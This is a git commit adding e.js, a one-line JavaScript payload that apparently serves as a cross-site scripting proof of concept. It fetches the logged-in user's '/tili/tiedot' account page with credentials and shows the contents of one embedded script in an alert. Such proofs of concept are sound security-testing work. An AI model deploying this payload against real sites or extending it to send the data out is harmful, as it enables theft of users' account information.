02ed0057f56dcbb88935d12d3585730b0b3e76cf
bbpa <57352896+bbpa@users.noreply.github.com>
2023-09-28 13:16:31 +0330

    Create e.js

---
+++ e.js
@@ -0,0 +1,1 @@
+xhr=new XMLHttpRequest();xhr.open('GET','/tili/tiedot');xhr.withCredentials=true;xhr.onreadystatechange=()=>{if(xhr.readyState==4){parser=new DOMParser();htmlDoc=parser.parseFromString(xhr.responseText, 'text/html');alert(htmlDoc.getElementsByTagName('script')[9].innerText);}};xhr.send()
